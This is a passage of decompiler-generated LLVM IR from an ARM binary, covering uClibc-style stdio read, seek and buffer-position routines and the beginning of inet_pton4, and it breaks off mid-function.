  store i32 %v6_1c8e8, i32* @r5, align 4
  store i32 %v12_1c8e8, i32* @r7, align 4
  ret i32 %v0_1ca14

; uselistorder directives
  uselistorder i32 %v0_1c9a8, { 1, 0 }
  uselistorder i32 %v3_1c924, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 40) to i32*), { 0, 3, 1, 2 }
  uselistorder i32 56, { 20, 16, 9, 10, 11, 12, 17, 2, 4, 3, 5, 18, 15, 8, 19, 6, 0, 7, 21, 13, 1, 14 }
  uselistorder label %dec_label_pc_1ca14, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1c9f8, { 1, 0 }
  uselistorder label %dec_label_pc_1c9f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1c9a8, { 1, 0 }
  uselistorder label %dec_label_pc_1c970, { 2, 1, 0 }
}

define i32 @function_1ca28(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ca28:
  %v0_1ca28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ca28, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1ca28
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1ca28, %bb
  %v10_1ca34 = phi i32 [ %arg1, %dec_label_pc_1ca28 ], [ 0, %bb ]
  ret i32 %v10_1ca34

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1ca38 = load i32, i32* @r4, align 4
  store i32 %v3_1ca38, i32* %stack_var_-12, align 4
  %v0_1ca3c = load i32, i32* %r0.global-to-local, align 4
  %v1_1ca3c = inttoptr i32 %v0_1ca3c to i16*
  %v2_1ca3c = load i16, i16* %v1_1ca3c, align 2
  %v3_1ca3c = zext i16 %v2_1ca3c to i32
  %v1_1ca40 = and i32 %v3_1ca3c, 4
  store i32 %v1_1ca40, i32* %r5.global-to-local, align 4
  %v2_1ca40 = icmp eq i32 %v1_1ca40, 0
  store i32 %v0_1ca3c, i32* %r4.global-to-local, align 4
  br i1 %v2_1ca40, label %dec_label_pc_1ca54, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1ca54:                               ; preds = %entry
  %v1_1ca54 = icmp slt i32 %arg2, 0
  br i1 %v1_1ca54, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1ca54
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1ca54, %bb18
  %v1_1ca5c = add i32 %v0_1ca3c, 4
  %v2_1ca5c = inttoptr i32 %v1_1ca5c to i32*
  %v3_1ca5c = load i32, i32* %v2_1ca5c, align 4
  store i32 %v3_1ca5c, i32* %r0.global-to-local, align 4
  %v1_1ca60 = call i32 @__GI_read(i32 %v3_1ca5c)
  store i32 %v1_1ca60, i32* %r0.global-to-local, align 4
  %v5_1ca68 = icmp sgt i32 %v1_1ca60, 0
  br i1 %v5_1ca68, label %.thread7, label %dec_label_pc_1ca6c

dec_label_pc_1ca6c:                               ; preds = %bb19
  %v2_1ca64 = icmp eq i32 %v1_1ca60, 0
  %v0_1ca6c = load i32, i32* %r4.global-to-local, align 4
  %v1_1ca6c = inttoptr i32 %v0_1ca6c to i16*
  %v2_1ca6c = load i16, i16* %v1_1ca6c, align 2
  br i1 %v2_1ca64, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1ca6c
  %v2_1ca70 = or i16 %v2_1ca6c, 4
  store i16 %v2_1ca70, i16* %v1_1ca6c, align 2
  %v1_1ca8c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_1ca6c
  %v2_1ca74 = or i16 %v2_1ca6c, 8
  store i16 %v2_1ca74, i16* %v1_1ca6c, align 2
  %v1_1ca80 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1ca80, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_1ca8c = phi i32 [ %v1_1ca8c.pre, %bb20 ], [ 0, %bb ], [ %v1_1ca60, %bb19 ], [ %v1_1ca80, %bb21 ]
  %v2_1ca88 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1ca88, i32* @r4, align 4
  ret i32 %v1_1ca8c

; uselistorder directives
  uselistorder i16 %v2_1ca6c, { 1, 0 }
  uselistorder i32 %v1_1ca60, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 1, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1ca90 = load i32, i32* @r4, align 4
  store i32 %v3_1ca90, i32* %stack_var_-12, align 4
  %v3_1ca94 = load i16, i16* %arg1, align 2
  %v4_1ca94 = zext i16 %v3_1ca94 to i32
  store i32 %v4_1ca94, i32* @ip, align 4
  %tmp17 = urem i16 %v3_1ca94, 4
  %v1_1ca98 = zext i16 %tmp17 to i32
  store i32 %v1_1ca98, i32* %r2.global-to-local, align 4
  %v2_1ca98 = icmp eq i16 %tmp17, 0
  br i1 %v2_1ca98, label %bb, label %dec_label_pc_1caac

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_1caac:                               ; preds = %entry
  %v1_1caac = add nsw i32 %v1_1ca98, -1
  %v7_1caac = icmp eq i16 %tmp17, 1
  br i1 %v7_1caac, label %bb14, label %dec_label_pc_1cab4

dec_label_pc_1cab4:                               ; preds = %dec_label_pc_1caac
  %v1_1cab4 = and i32 %v4_1ca94, 2048
  %v2_1cab4 = icmp eq i32 %v1_1cab4, 0
  br i1 %v2_1cab4, label %bb14, label %dec_label_pc_1cabc

dec_label_pc_1cabc:                               ; preds = %dec_label_pc_1cab4
  %v7_1cabc = icmp eq i32 %v1_1caac, 2
  br i1 %v7_1cabc, label %dec_label_pc_1cb40, label %dec_label_pc_1cac4

dec_label_pc_1cac4:                               ; preds = %dec_label_pc_1cabc
  %v2_1cac4 = add i32 %tmp, 40
  %v3_1cac4 = inttoptr i32 %v2_1cac4 to i32*
  %v4_1cac4 = load i32, i32* %v3_1cac4, align 4
  store i32 %v4_1cac4, i32* %r3.global-to-local, align 4
  %v2_1cac8 = icmp eq i32 %v4_1cac4, 0
  br i1 %v2_1cac8, label %dec_label_pc_1cad0, label %dec_label_pc_1cb40

dec_label_pc_1cad0:                               ; preds = %dec_label_pc_1cac4
  %v2_1cad0 = add i32 %tmp, 44
  %v3_1cad0 = inttoptr i32 %v2_1cad0 to i32*
  %v4_1cad0 = load i32, i32* %v3_1cad0, align 4
  store i32 %v4_1cad0, i32* %r3.global-to-local, align 4
  %v2_1cad4 = add i32 %tmp, 3
  %v3_1cad4 = inttoptr i32 %v2_1cad4 to i8*
  %v4_1cad4 = load i8, i8* %v3_1cad4, align 1
  %v5_1cad4 = zext i8 %v4_1cad4 to i32
  store i32 %v5_1cad4, i32* %r2.global-to-local, align 4
  %v2_1cad8 = icmp eq i32 %v4_1cad0, 0
  br i1 %v2_1cad8, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_1cad0
  %v1_1cae03 = sub nsw i32 0, %v5_1cad4
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_1cad0
  %v3_1cadc = add i32 %tmp, 2
  %v4_1cadc = inttoptr i32 %v3_1cadc to i8*
  %v5_1cadc = load i8, i8* %v4_1cadc, align 1
  %v6_1cadc = zext i8 %v5_1cadc to i32
  store i32 %v6_1cadc, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_1cadc, %v5_1cad4
  %v3_1cae4 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_1cab4, %dec_label_pc_1caac, %bb13
  %v1_1caf8 = phi i32 [ %v1_1cae03, %.thread1 ], [ %v1_1caac, %dec_label_pc_1cab4 ], [ %v1_1caac, %dec_label_pc_1caac ], [ 0, %bb ], [ %v3_1cae4, %bb13 ]
  %v1_1cae8 = and i32 %v4_1ca94, 64
  %v2_1cae8 = icmp eq i32 %v1_1cae8, 0
  %v2_1caec = add i32 %tmp, 16
  %v3_1caec = inttoptr i32 %v2_1caec to i32*
  %v4_1caec = load i32, i32* %v3_1caec, align 4
  store i32 %v4_1caec, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1cae8, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1caf8 = sub i32 %v1_1caf8, %v4_1caec
  store i32 %v2_1caf8, i32* %r3.global-to-local, align 4
  %v1_1cafc = inttoptr i32 %arg2 to i32*
  %v2_1cafc = load i32, i32* %v1_1cafc, align 4
  store i32 %v2_1cafc, i32* %r0.global-to-local, align 4
  %v3_1cafc = add i32 %arg2, 4
  %v4_1cafc = inttoptr i32 %v3_1cafc to i32*
  %v5_1cafc = load i32, i32* %v4_1cafc, align 4
  %v2_1cb00 = add i32 %storemerge, %v2_1caf8
  store i32 %v2_1cb00, i32* %r4.global-to-local, align 4
  %v2_1cb04 = sub i32 %v2_1cafc, %v2_1cb00
  store i32 %v2_1cb04, i32* %r2.global-to-local, align 4
  %v2_1cb08 = and i32 %v2_1cb00, 1073741824
  %v3_1cb08 = icmp ne i32 %v2_1cb08, 0
  %v4_1cb08 = ashr i32 %v2_1cb00, 31
  %v6_1cb08 = icmp eq i1 %v3_1cb08, false
  %v7_1cb08 = sub i32 %v5_1cafc, %v4_1cb08
  %v9_1cb08 = sext i1 %v6_1cb08 to i32
  %v10_1cb08 = add i32 %v7_1cb08, %v9_1cb08
  store i32 %v10_1cb08, i32* %r3.global-to-local, align 4
  %v2_1cb0c = sub i32 %v10_1cb08, %v5_1cafc
  %v4_1cb0c = xor i32 %v10_1cb08, %v5_1cafc
  %v5_1cb0c = xor i32 %v2_1cb0c, %v10_1cb08
  %v6_1cb0c = and i32 %v5_1cb0c, %v4_1cb0c
  %v7_1cb0c = icmp slt i32 %v6_1cb0c, 0
  %v8_1cb0c = icmp slt i32 %v2_1cb0c, 0
  %v9_1cb0c = icmp eq i32 %v10_1cb08, %v5_1cafc
  store i32 %v2_1cb04, i32* %v1_1cafc, align 4
  %v5_1cb10 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1cb10, i32* %v4_1cafc, align 4
  %v3_1cb14 = xor i1 %v8_1cb0c, %v7_1cb0c
  %v4_1cb14 = or i1 %v9_1cb0c, %v3_1cb14
  br i1 %v4_1cb14, label %dec_label_pc_1cb18, label %dec_label_pc_1cb24

dec_label_pc_1cb18:                               ; preds = %bb14
  br i1 %v9_1cb0c, label %dec_label_pc_1cb1c, label %dec_label_pc_1cb28thread-pre-split

dec_label_pc_1cb1c:                               ; preds = %dec_label_pc_1cb18
  %v0_1cb1c = load i32, i32* %r2.global-to-local, align 4
  %v1_1cb1c = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_1cb1c, %v1_1cb1c
  br i1 %tmp18, label %dec_label_pc_1cb24, label %dec_label_pc_1cb28thread-pre-split

dec_label_pc_1cb24:                               ; preds = %dec_label_pc_1cb1c, %bb14
  %v0_1cb24 = load i32, i32* %r4.global-to-local, align 4
  %v1_1cb24 = sub i32 0, %v0_1cb24
  store i32 %v1_1cb24, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb28

dec_label_pc_1cb28thread-pre-split:               ; preds = %dec_label_pc_1cb1c, %dec_label_pc_1cb18
  %v0_1cb28.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb28

dec_label_pc_1cb28:                               ; preds = %dec_label_pc_1cb28thread-pre-split, %dec_label_pc_1cb24
  %v0_1cb28 = phi i32 [ %v0_1cb28.pr, %dec_label_pc_1cb28thread-pre-split ], [ %v1_1cb24, %dec_label_pc_1cb24 ]
  %v1_1cb28 = icmp slt i32 %v0_1cb28, 0
  br i1 %v1_1cb28, label %dec_label_pc_1cb30, label %dec_label_pc_1cb44

dec_label_pc_1cb30:                               ; preds = %dec_label_pc_1cb28
  %v0_1cb30 = call i32 @__GI___errno_location()
  store i32 %v0_1cb30, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_1cb38 = inttoptr i32 %v0_1cb30 to i32*
  store i32 75, i32* %v2_1cb38, align 4
  %v0_1cb44.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb44

dec_label_pc_1cb40:                               ; preds = %dec_label_pc_1cac4, %dec_label_pc_1cabc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb44

dec_label_pc_1cb44:                               ; preds = %dec_label_pc_1cb28, %dec_label_pc_1cb30, %dec_label_pc_1cb40
  %v0_1cb44 = phi i32 [ %v0_1cb28, %dec_label_pc_1cb28 ], [ %v0_1cb44.pre, %dec_label_pc_1cb30 ], [ -1, %dec_label_pc_1cb40 ]
  store i32 %v0_1cb44, i32* %r0.global-to-local, align 4
  %v2_1cb4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1cb4c, i32* @r4, align 4
  ret i32 %v0_1cb44

; uselistorder directives
  uselistorder i32 %v0_1cb44, { 1, 0 }
  uselistorder i1 %v9_1cb0c, { 1, 0 }
  uselistorder i32 %v2_1cb0c, { 1, 0 }
  uselistorder i32 %v10_1cb08, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_1cafc, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i32 75, { 0, 3, 1, 2 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1cb44, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1cb54 = load i32, i32* @r4, align 4
  store i32 %v3_1cb54, i32* %stack_var_-8, align 4
  %v1_1cb58 = add i32 %arg1, 8
  %v1_1cb5c = inttoptr i32 %v1_1cb58 to i32*
  %v2_1cb5c = load i32, i32* %v1_1cb5c, align 4
  %v3_1cb5c = add i32 %arg1, 12
  %v4_1cb5c = inttoptr i32 %v3_1cb5c to i32*
  %v5_1cb5c = load i32, i32* %v4_1cb5c, align 4
  %v2_1cb60 = sub i32 %v5_1cb5c, %v2_1cb5c
  store i32 %v2_1cb60, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1cb68 = inttoptr i32 %arg1 to i16*
  %v4_1cb68 = call i32 @__stdio_READ(i16* %v3_1cb68, i32 %v2_1cb5c, i32 %v2_1cb60)
  %v0_1cb6c = load i32, i32* @r4, align 4
  %v1_1cb6c = add i32 %v0_1cb6c, 8
  %v2_1cb6c = inttoptr i32 %v1_1cb6c to i32*
  %v3_1cb6c = load i32, i32* %v2_1cb6c, align 4
  store i32 %v3_1cb6c, i32* %r2.global-to-local, align 4
  %v2_1cb70 = add i32 %v3_1cb6c, %v4_1cb68
  %v2_1cb74 = add i32 %v0_1cb6c, 20
  %v3_1cb74 = inttoptr i32 %v2_1cb74 to i32*
  store i32 %v2_1cb70, i32* %v3_1cb74, align 4
  %v0_1cb78 = load i32, i32* %r2.global-to-local, align 4
  %v1_1cb78 = load i32, i32* @r4, align 4
  %v2_1cb78 = add i32 %v1_1cb78, 16
  %v3_1cb78 = inttoptr i32 %v2_1cb78 to i32*
  store i32 %v0_1cb78, i32* %v3_1cb78, align 4
  %v2_1cb7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1cb7c, i32* @r4, align 4
  ret i32 %v4_1cb68

; uselistorder directives
  uselistorder i32 %v4_1cb68, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1cb84 = load i32, i32* @r4, align 4
  store i32 %v3_1cb84, i32* %stack_var_-12, align 4
  %v0_1cb88 = load i32, i32* @r0, align 4
  %v1_1cb88 = inttoptr i32 %v0_1cb88 to i16*
  %v2_1cb88 = load i16, i16* %v1_1cb88, align 2
  %v3_1cb88 = zext i16 %v2_1cb88 to i32
  store i32 %v3_1cb88, i32* %r3.global-to-local, align 4
  %v0_1cb8c = load i32, i32* @r1, align 4
  %v2_1cb8c = and i32 %v0_1cb8c, %v3_1cb88
  %v4_1cb8c = icmp eq i32 %v2_1cb8c, 0
  store i32 %v0_1cb88, i32* @r4, align 4
  br i1 %v4_1cb8c, label %dec_label_pc_1cb9c, label %dec_label_pc_1cbac

dec_label_pc_1cb9c:                               ; preds = %entry
  %v1_1cb9c = and i32 %v3_1cb88, 2176
  %v2_1cb9c = icmp eq i32 %v1_1cb9c, 0
  br i1 %v2_1cb9c, label %dec_label_pc_1cba4, label %dec_label_pc_1cbb8

dec_label_pc_1cba4:                               ; preds = %dec_label_pc_1cb9c
  %v2_1cba4 = or i32 %v0_1cb8c, %v3_1cb88
  store i32 %v2_1cba4, i32* %r3.global-to-local, align 4
  %v1_1cba8 = trunc i32 %v2_1cba4 to i16
  store i16 %v1_1cba8, i16* %v1_1cb88, align 2
  %v0_1cbac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1cbac

dec_label_pc_1cbac:                               ; preds = %entry, %dec_label_pc_1cba4
  %v0_1cbac = phi i32 [ %v0_1cb88, %entry ], [ %v0_1cbac.pre, %dec_label_pc_1cba4 ]
  %v1_1cbac = inttoptr i32 %v0_1cbac to i16*
  %v2_1cbac = load i16, i16* %v1_1cbac, align 2
  %v3_1cbac = zext i16 %v2_1cbac to i32
  store i32 %v3_1cbac, i32* %r3.global-to-local, align 4
  %v1_1cbb0 = and i32 %v3_1cbac, 16
  store i32 %v1_1cbb0, i32* %r5.global-to-local, align 4
  %v2_1cbb0 = icmp eq i32 %v1_1cbb0, 0
  br i1 %v2_1cbb0, label %dec_label_pc_1cbd8, label %dec_label_pc_1cbb8

dec_label_pc_1cbb8:                               ; preds = %dec_label_pc_1cb9c, %dec_label_pc_1cbac
  %v0_1cbb8 = call i32 @__GI___errno_location()
  store i32 %v0_1cbb8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1cbc0 = inttoptr i32 %v0_1cbb8 to i32*
  store i32 9, i32* %v2_1cbc0, align 4
  br label %dec_label_pc_1cbc4

dec_label_pc_1cbc4:                               ; preds = %dec_label_pc_1cbe0, %dec_label_pc_1cbb8
  %v0_1cbc4 = load i32, i32* @r4, align 4
  %v1_1cbc4 = inttoptr i32 %v0_1cbc4 to i16*
  %v2_1cbc4 = load i16, i16* %v1_1cbc4, align 2
  %v3_1cbc4 = zext i16 %v2_1cbc4 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1cbcc = or i32 %v3_1cbc4, 8
  store i32 %v1_1cbcc, i32* %r3.global-to-local, align 4
  %v1_1cbd0 = trunc i32 %v1_1cbcc to i16
  store i16 %v1_1cbd0, i16* %v1_1cbc4, align 2
  %v1_1cc18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cc10

dec_label_pc_1cbd8:                               ; preds = %dec_label_pc_1cbac
  %v1_1cbd8 = and i32 %v3_1cbac, 64
  %v2_1cbd8 = icmp eq i32 %v1_1cbd8, 0
  br i1 %v2_1cbd8, label %dec_label_pc_1cc00, label %dec_label_pc_1cbe0

dec_label_pc_1cbe0:                               ; preds = %dec_label_pc_1cbd8
  %v0_1cbe0 = call i32 @__stdio_wcommit()
  store i32 %v0_1cbe0, i32* %r0.global-to-local, align 4
  %v2_1cbe4 = icmp eq i32 %v0_1cbe0, 0
  br i1 %v2_1cbe4, label %dec_label_pc_1cbec, label %dec_label_pc_1cbc4

dec_label_pc_1cbec:                               ; preds = %dec_label_pc_1cbe0
  %v0_1cbec = load i32, i32* @r4, align 4
  %v1_1cbec = inttoptr i32 %v0_1cbec to i16*
  %v2_1cbec = load i16, i16* %v1_1cbec, align 2
  %v3_1cbec = zext i16 %v2_1cbec to i32
  store i32 %v3_1cbec, i32* %r3.global-to-local, align 4
  %v1_1cbf0 = add i32 %v0_1cbec, 8
  %v2_1cbf0 = inttoptr i32 %v1_1cbf0 to i32*
  %v3_1cbf0 = load i32, i32* %v2_1cbf0, align 4
  %v1_1cbf4 = and i32 %v3_1cbec, 65471
  store i32 %v1_1cbf4, i32* %r3.global-to-local, align 4
  %v2_1cbf8 = add i32 %v0_1cbec, 28
  %v3_1cbf8 = inttoptr i32 %v2_1cbf8 to i32*
  store i32 %v3_1cbf0, i32* %v3_1cbf8, align 4
  %v0_1cbfc = load i32, i32* %r3.global-to-local, align 4
  %v1_1cbfc = trunc i32 %v0_1cbfc to i16
  %v2_1cbfc = load i32, i32* @r4, align 4
  %v3_1cbfc = inttoptr i32 %v2_1cbfc to i16*
  store i16 %v1_1cbfc, i16* %v3_1cbfc, align 2
  %v0_1cc00.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1cc00

dec_label_pc_1cc00:                               ; preds = %dec_label_pc_1cbd8, %dec_label_pc_1cbec
  %v2_1cc08 = phi i32 [ %v0_1cbac, %dec_label_pc_1cbd8 ], [ %v0_1cc00.pre, %dec_label_pc_1cbec ]
  %v1_1cc00 = inttoptr i32 %v2_1cc08 to i16*
  %v2_1cc00 = load i16, i16* %v1_1cc00, align 2
  %v3_1cc00 = zext i16 %v2_1cc00 to i32
  %v1_1cc04 = or i32 %v3_1cc00, 1
  store i32 %v1_1cc04, i32* %r3.global-to-local, align 4
  %v1_1cc08 = trunc i32 %v1_1cc04 to i16
  store i16 %v1_1cc08, i16* %v1_1cc00, align 2
  %v0_1cc0c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1cc0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cc10

dec_label_pc_1cc10:                               ; preds = %dec_label_pc_1cbc4, %dec_label_pc_1cc00
  %v1_1cc18 = phi i32 [ %v1_1cc18.pre, %dec_label_pc_1cbc4 ], [ %v0_1cc0c, %dec_label_pc_1cc00 ]
  %v2_1cc14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1cc14, i32* @r4, align 4
  ret i32 %v1_1cc18

; uselistorder directives
  uselistorder i32 %v3_1cb88, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_1cc10, { 1, 0 }
  uselistorder label %dec_label_pc_1cc00, { 1, 0 }
  uselistorder label %dec_label_pc_1cbb8, { 1, 0 }
  uselistorder label %dec_label_pc_1cbac, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_1cc28 = load i32, i32* %arg2, align 4
  %v3_1cc28 = add i32 %tmp, 4
  %v4_1cc28 = inttoptr i32 %v3_1cc28 to i32*
  %v5_1cc28 = load i32, i32* %v4_1cc28, align 4
  %v1_1cc2c = add i32 %arg1, 4
  %v2_1cc2c = inttoptr i32 %v1_1cc2c to i32*
  %v3_1cc2c = load i32, i32* %v2_1cc2c, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_1cc34 = call i32 @__GI_lseek64(i32 %v3_1cc2c, i32 %tmp, i32 %v2_1cc28, i32 %v5_1cc28)
  %v1_1cc38 = icmp slt i32* %arg2, null
  br i1 %v1_1cc38, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_1cc405 = load i32, i32* @r4, align 4
  %v4_1cc406 = inttoptr i32 %v3_1cc405 to i32*
  store i32 %v4_1cc34, i32* %v4_1cc406, align 4
  %v6_1cc407 = add i32 %v3_1cc405, 4
  %v7_1cc408 = inttoptr i32 %v6_1cc407 to i32*
  store i32 %tmp, i32* %v7_1cc408, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_1cc34, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 3, 0, 4, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 16, 19, 20, 21, 22, 23, 24, 30, 31, 28, 29, 27, 26, 25, 32, 33, 34, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1cc58 = load i32, i32* @r4, align 4
  %v6_1cc58 = load i32, i32* @r5, align 4
  %v15_1cc58 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1cc70 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1cc70, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_1cce81 = load i32, i32* @r0, align 4
  %v1_1cce82 = inttoptr i32 %v0_1cce81 to i8*
  %v2_1cce83 = load i8, i8* %v1_1cce82, align 1
  %v3_1cce84 = zext i8 %v2_1cce83 to i32
  store i32 %v3_1cce84, i32* @r3, align 4
  %v2_1ccec5 = icmp eq i8 %v2_1cce83, 0
  store i1 %v2_1ccec5, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ccec5, label %dec_label_pc_1ccf8, label %dec_label_pc_1cc88

dec_label_pc_1cc88:                               ; preds = %entry, %dec_label_pc_1cce8.backedge
  %v0_1cc8c = phi i32 [ %v0_1cce8, %dec_label_pc_1cce8.backedge ], [ %v0_1cce81, %entry ]
  %v0_1ccc4 = phi i32 [ %v3_1cce8, %dec_label_pc_1cce8.backedge ], [ %v3_1cce84, %entry ]
  %v2_1cc98.in = phi i32 [ %v3_1cce8, %dec_label_pc_1cce8.backedge ], [ %v3_1cce84, %entry ]
  %v2_1cc98 = add nsw i32 %v2_1cc98.in, -48
  %v2_1cc88 = icmp ugt i32 %v2_1cc98, 8
  %v7_1cc88 = icmp eq i32 %v2_1cc98, 9
  store i1 %v7_1cc88, i1* %cpsr_z.global-to-local, align 1
  %v1_1cc8c = add i32 %v0_1cc8c, 1
  store i32 %v1_1cc8c, i32* %r0.global-to-local, align 4
  %v2_1cc90 = xor i1 %v7_1cc88, true
  %v3_1cc90 = and i1 %v2_1cc88, %v2_1cc90
  br i1 %v3_1cc90, label %dec_label_pc_1ccc4, label %dec_label_pc_1cc94

dec_label_pc_1cc94:                               ; preds = %dec_label_pc_1cc88
  %v0_1cc94 = load i32, i32* %r1.global-to-local, align 4
  %v1_1cc94 = inttoptr i32 %v0_1cc94 to i8*
  %v2_1cc94 = load i8, i8* %v1_1cc94, align 1
  %v3_1cc94 = zext i8 %v2_1cc94 to i32
  %v0_1cc98 = load i32, i32* %r7.global-to-local, align 4
  %v3_1cc98 = mul i32 %v0_1cc98, %v3_1cc94
  %v4_1cc98 = add i32 %v3_1cc98, %v2_1cc98
  store i32 %v4_1cc98, i32* @r3, align 4
  %v2_1cc9c = icmp ugt i32 %v4_1cc98, 254
  %v7_1cc9c = icmp eq i32 %v4_1cc98, 255
  store i1 %v7_1cc9c, i1* %cpsr_z.global-to-local, align 1
  %v2_1cca0 = xor i1 %v7_1cc9c, true
  %v3_1cca0 = and i1 %v2_1cc9c, %v2_1cca0
  br i1 %v3_1cca0, label %dec_label_pc_1cd1c, label %dec_label_pc_1cca4

dec_label_pc_1cca4:                               ; preds = %dec_label_pc_1cc94
